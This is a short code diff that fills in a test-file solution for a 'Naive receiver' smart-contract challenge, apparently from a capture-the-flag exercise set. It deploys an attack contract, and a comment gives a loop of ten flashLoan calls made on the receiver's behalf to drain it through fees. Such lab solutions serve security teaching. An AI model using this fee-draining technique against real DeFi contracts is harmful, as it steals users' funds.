@@ -37,7 +37,22 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+      const NaiveAttackContract = await ethers.getContractFactory(
+        "NaiveReceiverAttack",
+        deployer
+      );
+      const attacker = await NaiveAttackContract.deploy(pool.address);
+      await attacker.attack(receiver.address, await pool.ETH());
+
+      /* 
+      Can be solved without using a separate attack contract by using the code below:
+
+      for (let i = 0; i < 10; i++) {
+        pool
+          .connect(deployer)
+          .flashLoan(receiver.address, await pool.ETH(), 0, "0x");
+      }
+      */
     });
 
     after(async function () {
